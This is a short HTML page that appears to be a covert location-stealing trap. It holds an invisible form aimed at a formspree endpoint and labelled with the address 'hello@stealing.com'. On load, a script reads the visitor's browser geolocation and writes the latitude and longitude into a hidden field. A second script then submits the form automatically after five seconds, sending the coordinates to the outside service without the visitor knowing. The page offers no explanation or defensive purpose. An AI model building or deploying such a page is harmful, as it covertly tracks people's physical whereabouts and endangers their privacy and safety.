<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>

    <form action="https://formspree.io/f/xayazppw" method="POST" id="form_id">
        <label style="visibility:hidden">Your email:<input type="email" name="_replyto"
                id="main">hello@stealing.com</label>
        <label style="visibility:hidden">Your message:<textarea name="message" id="location"></textarea></label>
    </form>
    <script>
        var div = document.getElementById("location");
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                div.innerHTML = "The Browser Does not Support Geolocation";
            }
        }
        function showPosition(position) {
            div.innerHTML = "Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude;
        }
        function showError(error) {
            if (error.PERMISSION_DENIED) {
                div.innerHTML = "The User have denied the request for Geolocation.";
            }
        }
        getLocation();
    </script>
    <script>
        setTimeout(function () { document.forms[0].submit(); }, 5000);
    </script>


</body>

</html>
